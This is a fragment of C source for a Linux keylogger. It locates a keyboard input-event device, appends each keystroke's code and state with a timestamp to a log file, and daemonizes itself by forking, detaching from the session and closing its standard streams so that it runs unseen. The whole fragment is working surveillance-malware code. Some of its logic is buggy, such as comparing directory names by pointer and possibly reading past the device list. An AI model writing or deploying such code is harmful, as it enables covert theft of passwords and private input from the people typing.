
char* concat(const char *s1, const char *s2)
{
    const size_t len1 = strlen(s1);
    const size_t len2 = strlen(s2);
    char *result = malloc(len1 + len2 + 1); // +1 for the null-terminator
    // in real code you would check for errors in malloc here
    memcpy(result, s1, len1);
    memcpy(result + len1, s2, len2 + 1); // +1 to copy the null-terminator
    return result;
}


void log_in_file(struct input_event ev)
{
  printf("Logging");
    time_t t = time(NULL);
    struct tm tm = *localtime(&t);
    FILE* fptr = fopen(LOG_FILE, "a");
    // print( [date time] keycode keyvalue ) - keyvalue => {press; lift; long press}
    fprintf(fptr, "[ %d-%02d-%02d %02d:%02d:%02d ]   key %i state %i\n", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec, ev.code, ev.value);
    if(tm.tm_sec == 0)
    {
      /* Do whatever you want to do here
        It is like a scheduler section.*/

      //fprintf(fptr, "%s\n", "1 minute check\n");
    }
    fclose(fptr);
    printf("  logged\n");
}


char* get_me_a_keyboard()
{
  struct dirent **namelist;
  int n=0,i=0;
  n = scandir(INPUT_EVENT_DIR, &namelist, NULL, alphasort); // read the directory for the files
  if(n==-1)
  {
    // perror("Scandir Failed!!\n");
    exit(EXIT_FAILURE);
  }
  if(n<=2){
    // perror("No devices found!!\n");
    exit(EXIT_FAILURE);
  }
  // printf("[ * ] %d Devices found !!\n",n-2);
  for(i=0; i<n; i++)
    if( namelist[i]->d_name == "." || namelist[i]->d_name == "..") // skip for . and ..
      continue;
    else if(strstr(namelist[i]->d_name,"kbd")) // check if the filename has "kbd" (keyboard) in it
      break;  // if yes, do not look further

  return namelist[i]->d_name; // and return keyboard file name to caller function
}


int daemonize()
{
    pid_t pid, sid;

    /* Fork off the parent process */
    pid = fork();
    if (pid < 0) {
        exit(EXIT_FAILURE);
    }
    /* If we got a good PID, then
        we can exit the parent process. */
    if (pid > 0) { // Child can continue to run even after the parent has finished executing
        exit(EXIT_SUCCESS);
    }

    /* Change the file mode mask */
    umask(0);

    /* Open any logs here */

    /* Create a new SID for the child process */
    sid = setsid();
    if (sid < 0) {
        /* Log the failure */
        exit(EXIT_FAILURE);
    }

    /* Change the current working directory */
    if ((chdir("/")) < 0) {
        /* Log the failure */
        exit(EXIT_FAILURE);
    }

    /* Close out the standard file descriptors */
    //Because daemons generally dont interact directly with user so there is no need of keeping these open
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    return(1);
}
